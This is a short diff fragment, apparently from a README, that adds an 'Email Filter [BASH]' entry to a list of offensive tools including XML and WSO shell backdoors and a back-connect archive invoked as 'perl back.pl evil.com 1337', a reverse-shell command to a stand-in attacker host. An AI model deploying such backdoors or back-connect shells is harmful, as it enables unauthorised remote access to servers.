@@ -10,3 +10,4 @@
 * XML Shell Backdoor
 * Backconnect.zip ( perl back.pl evil.com 1337 )
 * WSO Shell Backdoor
+* Email Filter [BASH]
